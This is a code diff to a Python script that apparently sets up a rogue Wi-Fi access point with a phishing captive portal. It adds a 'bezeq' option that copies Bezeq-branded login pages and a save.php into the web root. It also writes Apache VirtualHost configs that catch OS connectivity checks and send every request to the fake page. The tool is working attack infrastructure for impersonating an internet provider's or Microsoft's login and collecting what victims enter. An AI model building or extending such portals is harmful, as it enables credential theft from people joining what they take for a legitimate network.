@@ -260,6 +260,13 @@ def setup_captive_portal_files(Cap: str):
             shutil.copy("Microsoft/save.php", os.path.join(portal_dir, "save.php"))
             shutil.copy("Microsoft/save2.php", os.path.join(portal_dir, "save2.php"))
             shutil.copy("Microsoft/microsoft.svg", os.path.join(portal_dir, "microsoft.svg"))
+        if Cap == "bezeq": 
+            shutil.copy("Bezeq/index.html", os.path.join(portal_dir, "index.html"))
+            shutil.copy("Bezeq/ghh.css", os.path.join(portal_dir, "ghh.css"))
+            shutil.copy("Bezeq/save.php", os.path.join(portal_dir, "save.php"))
+            shutil.copy("Bezeq/route_simple.png", os.path.join(portal_dir, "route_simple.png"))
+            shutil.copy("Bezeq/sn.png", os.path.join(portal_dir, "sn.png"))
+            shutil.copy("Bezeq/b.png", os.path.join(portal_dir, "b.png"))
         
         print("[+] Captive portal files copied successfully.")
     except Exception as e:
@@ -288,6 +295,13 @@ def setup_captive_portal_files_dual(Cap: str):
             shutil.copy("Microsoft/Dual/save.php", os.path.join(portal_dir, "save.php"))
             shutil.copy("Microsoft/Dual/save2.php", os.path.join(portal_dir, "save2.php"))
             shutil.copy("Microsoft/Dual/microsoft.svg", os.path.join(portal_dir, "microsoft.svg"))
+        if Cap == "bezeq": 
+            shutil.copy("Bezeq/Dual/index.html", os.path.join(portal_dir, "index.html"))
+            shutil.copy("Bezeq/Dual/ghh.css", os.path.join(portal_dir, "ghh.css"))
+            shutil.copy("Bezeq/Dual/save.php", os.path.join(portal_dir, "save.php"))
+            shutil.copy("Bezeq/Dual/route_simple.png", os.path.join(portal_dir, "route_simple.png"))
+            shutil.copy("Bezeq/Dual/sn.png", os.path.join(portal_dir, "sn.png"))
+            shutil.copy("Bezeq/Dual/b.png", os.path.join(portal_dir, "b.png"))
         
         print("[+] Captive portal files copied successfully.")
     except Exception as e:
@@ -494,6 +508,114 @@ def create_vhost_microsoft_dual():
 
 #####################################################################
 
+def create_vhost_bezeq():
+    vhost_file = "/etc/apache2/sites-available/captive.conf"
+    print(f"[*] Creating VirtualHost file: {vhost_file}...")
+    
+    vhost_content = r"""
+<VirtualHost *:80>
+    ServerName captive.portal
+    ServerAlias *
+    DocumentRoot /var/www/captive
+
+    <Directory /var/www/captive>
+        Options -MultiViews
+        AllowOverride None
+        Require all granted
+        DirectoryIndex index.html index.php
+    </Directory>
+
+    Alias /hotspot-detect.html /var/www/captive/index.html
+    Alias /generate_204       /var/www/captive/index.html
+    Alias /connecttest.txt    /var/www/captive/index.html
+
+    RewriteEngine On
+
+
+    RewriteCond %{REQUEST_URI} !^/(hotspot-detect\.html|generate_204|connecttest\.txt)$
+
+    RewriteRule ^/?(save\.php|password\.php|save2\.php|microsoft\.svg)$ - [L,NC]
+
+    RewriteCond %{REQUEST_FILENAME} -f [OR]
+    RewriteCond %{REQUEST_FILENAME} -d
+    RewriteRule ^ - [L]
+
+
+    RewriteRule \.(?:css|js|png|jpe?g|gif|ico|svg|webp|woff2?|ttf|eot|map)$ - [L,NC]
+
+    RewriteRule ^ /index.html [L]
+
+    Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
+    Header always set Pragma "no-cache"
+    Header always set Expires "0"
+    Header always set X-VHost "captive-portal"
+
+    AddType image/svg+xml .svg .svgz
+</VirtualHost>
+"""
+    try:
+        with open(vhost_file, "w") as f:
+            f.write(vhost_content.strip())
+        print("[+] VirtualHost file created.")
+    except Exception as e:
+        print(f"[-] Failed to create VirtualHost file: {e}")
+        sys.exit(1)
+
+#####################################################################
+
+def create_vhost_bezeq_dual():
+    vhost_file = "/etc/apache2/sites-available/captive2.conf"
+    print(f"[*] Creating VirtualHost file: {vhost_file}...")
+    
+    vhost_content = r"""
+<VirtualHost *:80>
+    ServerName captive.portal
+    ServerAlias *
+    DocumentRoot /var/www/captive
+
+    <Directory /var/www/captive>
+        Options -MultiViews
+        AllowOverride None
+        Require all granted
+        DirectoryIndex index.html index.php
+    </Directory>
+
+    Alias /hotspot-detect.html /var/www/captive/index.html
+    Alias /generate_204       /var/www/captive/index.html
+    Alias /connecttest.txt    /var/www/captive/index.html
+
+    RewriteEngine On
+
+    RewriteCond %{REQUEST_URI} !^/(hotspot-detect\.html|generate_204|connecttest\.txt)$
+
+    RewriteRule ^/?(save\.php|password\.php|save2\.php|microsoft\.svg)$ - [L,NC]
+
+    RewriteCond %{REQUEST_FILENAME} -f [OR]
+    RewriteCond %{REQUEST_FILENAME} -d
+    RewriteRule ^ - [L]
+
+
+    RewriteRule \.(?:css|js|png|jpe?g|gif|ico|svg|webp|woff2?|ttf|eot|map)$ - [L,NC]
+
+    RewriteRule ^ /index.html [L]
+
+    Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
+    Header always set Pragma "no-cache"
+    Header always set Expires "0"
+    Header always set X-VHost "captive-portal"
+
+    AddType image/svg+xml .svg .svgz
+</VirtualHost>
+"""
+    try:
+        with open(vhost_file, "w") as f:
+            f.write(vhost_content.strip())
+        print("[+] VirtualHost file created.")
+    except Exception as e:
+        print(f"[-] Failed to create VirtualHost file: {e}")
+        sys.exit(1)
+        
+#####################################################################
 def enable_apache_site():
     print("[*] Enabling captive portal Apache site...")
     commands = [
@@ -857,7 +979,7 @@ def main():
     parser.add_argument("--band", dest="band", choices=["2.4", "5"], help="Choose WiFi band: 2.4GHz or 5GHz")
     parser.add_argument('--channel', type=int, help="Channel for the network")
     parser.add_argument('--network', required=True, help="Network address in CIDR format ( 192.168.50.0/24)")
-    parser.add_argument("--CaptivePortal", dest="Cap", choices=["default", "microsoft"], default="default", help="Choose Your Captive Portal")
+    parser.add_argument("--CaptivePortal", dest="Cap", choices=["default", "microsoft", "bezeq"], default="default", help="Choose Your Captive Portal")
     parser.add_argument("--Dual", dest="dual", action="store_true", help="for fual band")
     parser.add_argument("--iface1", dest="iface1", help="First interface Bind to channel 2.4")
     parser.add_argument("--iface2", dest="iface2", help="Second interface Bind to channel 5")
@@ -911,7 +1033,10 @@ def main():
             setup_captive_portal_files("default")
         elif script_args.Cap == 'microsoft':
             setup_captive_portal_files_dual("microsoft")
-            setup_captive_portal_files("microsoft")     
+            setup_captive_portal_files("microsoft")   
+        elif script_args.Cap == 'bezeq':
+            setup_captive_portal_files_dual("bezeq")
+            setup_captive_portal_files("bezeq")   
 
         setup_log_file_dual()
         setup_log_file()
@@ -922,6 +1047,9 @@ def main():
         elif script_args.Cap == 'microsoft':
             create_vhost_microsoft_dual()
             create_vhost_microsoft()
+        elif script_args.Cap == 'bezeq':
+            create_vhost_bezeq_dual()
+            create_vhost_bezeq()
 
         enable_apache_site_dual()
         
@@ -960,7 +1088,9 @@ def main():
         if script_args.Cap == 'default':
             setup_captive_portal_files("default")
         elif script_args.Cap == 'microsoft':
-            setup_captive_portal_files("microsoft")  
+            setup_captive_portal_files("microsoft")
+        elif script_args.Cap == 'bezeq':
+            setup_captive_portal_files("bezeq")  
 
         setup_log_file()
 
@@ -968,6 +1098,8 @@ def main():
             create_vhost()
         elif script_args.Cap == 'microsoft':
             create_vhost_microsoft()
+        elif script_args.Cap == 'bezeq':
+            create_vhost_bezeq()
 
         enable_apache_site()
 
